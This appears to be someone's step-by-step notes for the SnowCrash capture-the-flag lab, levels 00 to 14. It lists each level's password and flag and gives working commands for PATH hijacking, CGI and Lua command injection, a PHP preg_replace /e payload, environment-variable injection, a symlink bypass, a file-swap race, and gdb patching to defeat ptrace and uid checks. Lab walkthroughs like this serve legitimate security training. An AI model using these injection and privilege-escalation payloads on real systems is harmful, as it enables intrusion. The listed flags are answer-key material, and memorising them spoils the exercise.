0 - Search for writable/readable files (find / -writable(-readable) -type d(f) 2>/dev/null)
1 - List users (cat /etc/passwd)
2 - Find target
3 - Get ids (id target)
4 - Find files from target (find -user flag00 -type f 2>/dev/null)
5 - Crach passwd file with john

method to search:
	grep -d recurse [SEARCH] . 2>/dev/null | cut -d":" -f 1 | sort | uniq
	find . -name "*[SEARCH]*"

method for executables:
	try it
	permissions
	strings
	ltrace


level00 -> level00
	find / -user flag00 2>/dev/null
	cat /usr/sbin/john
		search for "sbin john" -> john the ripper ?
	use caesar cdiiddwpgswtgt

	flag00 -> nottoohardhere

level01 -> x24ti5gi3x0ol2eh4esiuxias
	scp passwd herrfalco@192.168.1.86:~/SnowCrash
	john passwd --show

	flag01 -> abcdefg

level02 -> f2av5il02puano7naaf6adaaf
	scp level02.pcap herrfalco@192.168.1.86:~/SnowCrash
	tcpick -C -yP -r level02.pcap

	flag02 -> ft_waNDReL0L (zero inside)

level03 -> kooda2puivaav1idi4f57q8iq
	try level03
	permissions s created by flag03
	ltrace level03 -> permissions -> echo substitute to getflag
	find . -writable -type d 2>/dev/null
	export PATH=/tmp:$PATH
	vim echo -> "#!/bin/bash
		getflag"
	chmod 777 echo
	scp -P 4242 echo level03@192.168.1.25:/tmp
	
	flag03 -> X

level04 -> qi0maab88jeaj46qoumi7maus
	permissions s created by flag04
	cat level04.pl -> CGI -> Server ?
	search in /etc find apache2
	cat /etc/apache2/sites-enabled -> :4747
	>
	"DocumentRoot    /var/www/level04/"
	SuexecUserGroup flag04 level04
	DirectoryIndex level04.pl
	<
	create cgi_request :
	>
	GET /?x=`getflag` HTTP/1.1
	Host: nobody
	
	<
	nc 192.168.1.25 4747 < cgi_request

	flag04 -> X

level05 -> ne2searoevaevoem4ov4ar8ap
	new mail ?
	find / -name mail 2>/dev/null
	cat /var/mail/level05
	>
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	<
	cat /usr/sbin/openarenaserver
	create cront_tab
	>
	getflag > /tmp/result
	<
	scp -P 4242 ./cron_tab level05@192.168.1.25:/opt/openarenaserver/
	chmod 777 cron_tab
	wait until it disapear
	cat /tmp/result

	flag05 -> X

level06 -> viuaaale9huek52boumoomioc
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	/e -> exploit
	create file
	>
	[x {${exec(getflag)}}]
	<
	scp -P 4242 ./php_cmd level06@192.168.1.25:/tmp/php_cmd
	./level06 /tmp/php_cmd

	flag06 -> X

level07 -> wiok45aaoguiboiki2tuin6ub
	permissions s
	run with ltrace
	>
	getenv("LOGNAME") = "level07"
	asprintf(0xbffff744, 0x8048688, 0xbfffff48, 0xb7e5ee55, 0xb7fed280) = 18
	system("/bin/echo level07 ")
	<
	export LOGNAME="; getflag;"
	run

	flag07 -> X

level08 -> fiumuikeil55xe9cu4dood66h
	permissions s
	run -> file to read
	echo bonjour > /tmp/bonjour; ./level08 /tmp/bonjour
	ltrace ./level08 /tmp/bonjour
	ltrace ./level08 token
	-> filter by name with strstr
	ln -s ~/token /tmp/boken
	./level08 /tmp/boken

	flag08 -> quif5eloekouj29ke0vouxean

level09 -> 25749xKZ8L7DkSCwJkT9dyv6f
	run with "aaaaaaaaaa" argument
	-> abcdefghij
	cat token -> code to decode
	create decoder.c
	>
	int main(void) {
		int i = 0;
		char c = 0;

		for (i = 0; read(0, &c, 1) > 0; ++i) {
			printf("%c", c - i);
		}
		printf("\n");
		return (0);
	}
	<
	scp -P 4242 decoder.c level09@192.168.1.16:/tmp
	gcc -Wall -Wextra /tmp/decoder.c -o /tmp/decoder
	cat /home/user/level09 | /tmp/decoder
	
	flag09 -> f3iji1ju5yuevaus41q1afiuq

level10 -> s5cAJpM8ev6XHw998pRWG728z
	run level10
	>
	./level10 file host
		sends file to host if you have access to it
	<
	try level10 token 192.168.1.13
	> You don't have access to token
	echo bonjour > /tmp/bonjour
	./level10 /tmp/bonjour 192.168.1.13
	> Connecting to 192.168.1.13:6969 .. Unable to connect to host 192.168.1.13
	run ruby server on host and retry
	>
	Connecting to 192.168.1.13:6969 .. Connected!
	Sending file .. wrote file!
	<
	retry with ltrace
	>
	access("/tmp/bonjour", 4)
	open("/tmp/bonjour", 0, 010)
	<
	security hole -> try to replace file between access and open
	scp -P 4242 sender.sh level10@192.168.1.16:/tmp
	scp -P 4242 replacer.sh level10@192.168.1.16:/tmp
	/tmp/sender.sh
	ctrl-Z
	bg
	jobs
	./server.rb (on host)
	/tmp/replacer.sh
	ctrl-C and kill -9 for job

	flag10 -> woupa2yuojeeaaed06riuj63c

level11 -> feulo4b72j7edeahuete3no7c
	read code -> lua server waiting for password
	> prog = io.popen("echo "..pass.." | sha1sum", "r")
	run -> already running
	telnet 127.0.0.1 5151
	write -> lol; getflag > /tmp/flag; echo lol
	cat /tmp/flag

	flag11 -> X

level12 -> fa6v5ateaw21peobuub8ipe6s
	read code -> CGI on 4646
	$xx =~ tr/a-z/A-Z/; -> letters modified
	$xx =~ s/\s.*//; -> after space trimmed
	@output = `egrep "^$xx" /tmp/xd 2>&1`;	
	create /tmp/_
	>
	#!/bin/bash

	getflag > /tmp/flag
	<
	chmod 777 on /tmp/_
	vim /etc/apache2/sites-available/level12.conf
	send cgi_request_level12

	flag12 -> X

level13 -> g1qKMiRpXf53AWhDaU7FEkczr
	run with ltrace -> getuid
	run with gdb
	b getuid
	run
	next til end of getuid
	info registers
	set $eax 4242
	next til end

	flag13 -> X

level14 -> 2A31L79asukciNyi8uppkEuSx
	nothing....
	run getflag with ltrace -> ptrace
	run with gdb to bypass ptrace
	>
	b ptrace
	run
	next
	info registers
	set $eax=0
	info registers
	next
	b getuid
	run
	next
	set $eax=0
	next
	next
	info registers
	set $eax=3014 (flag14)
	info registers
	<

	flag14 -> 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
